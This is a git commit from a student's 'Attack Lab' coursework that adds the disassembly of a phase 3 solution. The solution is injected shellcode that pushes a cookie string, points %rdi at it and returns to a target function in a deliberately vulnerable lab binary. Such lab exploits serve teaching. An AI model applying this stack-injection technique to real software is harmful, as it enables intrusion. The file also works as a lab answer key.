c9a4cce107ae587612ddbfc3861d92a1a9103b84
cilinmengye <834430027@qq.com>
2024-03-16 21:03:15 +0800

    finish phase_2 and phase_3 in attack lab

---
+++ Attack_Lab/target1/phase_3.d
@@ -0,0 +1,14 @@
+
+phase_3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	6a 00                	push   $0x0
+   2:	48 bf 35 39 62 39 39 	movabs $0x6166373939623935,%rdi
+   9:	37 66 61 
+   c:	57                   	push   %rdi
+   d:	bf 98 dc 61 55       	mov    $0x5561dc98,%edi
+  12:	68 fa 18 40 00       	push   $0x4018fa
+  17:	c3                   	ret    
